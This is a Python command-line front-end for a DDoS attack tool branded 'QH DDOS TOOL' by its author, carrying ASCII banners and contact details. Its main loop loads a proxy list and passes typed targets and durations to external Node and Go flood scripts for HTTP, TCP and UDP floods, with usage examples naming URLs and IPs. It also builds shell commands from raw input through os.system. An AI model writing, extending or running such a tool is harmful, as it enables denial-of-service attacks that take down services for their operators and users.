from colorama import Fore, Back, Style
import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(Fore.BLUE + """
     ██░ ██  ▄▄▄     ▄▄▄█████▓ ▒█████   ██ ▄█▀ ██▓
    ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓██▒
    ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒██▒
    ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▓██ █▄ ░██░
    ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░██░
     ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  
     ▒ ░▒░ ░  ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░
     ░  ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░ ░░ ░  ▒ ░
     ░  ░  ░      ░  ░            ░ ░  ░  ░    ░   by QuocHoang
                                           """)
    time.sleep(1.8)
    clear()

def si():
    print("Zalo/Call: 0384564644")
    print("Information: http://quochoangprofile.ga/")

def menu():
    sys.stdout.write(f"QH DDOSv1")
    clear()
    print('HaToKi DDoS By quochoangprofile.ga/] ')
    print("http://quochoangprofile.ga/")
    print(Fore.BLUE + """

            ╚═════════════════════╦═════════════════════════════════════════╦══════════════════════╝
                ╔═════════════════╩══════════════[QH DDOS TOOL]══════════════╩══════════════════╗
               ╔╝------------------------------------------------------------------------------╚╗
               ║                                                                                ║
               ║                        QQQ   H  H    DDD  DDD   OOO   SSS                       ║
               ║                       Q   Q  H  H    D  D D  D O   O S                         ║ 
               ║                       Q   Q  HHHH    D  D D  D O   O  SSS                      ║
               ║                       Q  QQ  H  H .. D  D D  D O   O     S                     ║
               ║                        QQQQ  H  H .. DDD  DDD   OOO  SSSS                      ║
               ║                            Q                                                   ║
               ║                                                                                ║
               ║                                                                                ║
               ║                                                                                ║
               ║                                                                                ║
               ║                                                                                ║
               ║------------Link faceBook :https://www.facebook.com/quochoang.profile/----------║
               ╚════════════════════════╦═══════════════════════════╦═══════════════════════════╝
                     ╔══════════════════╩═══════════════════════════╩═══════════════════╗
                     ║-------------- --------------QH DDODV1-------------------------- -║ 
                     ╚═════════════╦══════════════════════════════════════╦═════════════╝
                         ╔═════════╩═════════╗                  ╔═════════╩═════════╗
                         ║  quochoangprofile ╠══════════════════╣  quochoangprofile ║
                         ║    0384564644     ║ -   -   -   -  - ║     0384564644    ║
                         ║                   ╠══════════════════╣                   ║
                         ╚═══════════════════╝                  ╚═══════════════════╝

""")

def main():
    menu()
    while(True):
        cnc = input('''Input :''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            ()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            ()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            ()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            ()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            ()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            ()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            ()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            ()

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-socket <url> <per> <time>')
                print(Fore.BLUE +'Example: http-socket http://quochoangprofile.ga/ 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-raw <url> <time>')
                print(Fore.BLUE +'Example: http-raw http://quochoangprofile.ga/ 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-requests <url> <time>')
                print(Fore.BLUE +'Example: http-requests http://quochoangprofile.ga/ 60')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print(Fore.BLUE +'Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print(Fore.BLUE +'MODE: [1] TCP')
                print(Fore.BLUE +'      [2] UDP')
                print(Fore.BLUE +'      [3] HTTP')
                print(Fore.BLUE +'Example: stress 1.1.1.1 80/443 3 1250 60 5')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print(Fore.BLUE +'Usage: http-rand <url> <time>')
                print(Fore.BLUE +'Example: http-rand http://quochoangprofile.ga/ 60')

        elif "sever" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} -data {method}')
            except IndexError:
                print(Fore.BLUE +'Usage: sever <url> METHODS<GET/POST>')
                print(Fore.BLUE +'Example: sever http://quochoangprofile.ga/ GET')

        elif "info" in cnc:
            print(f'''
[http://quochoangprofile.ga/]

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
main()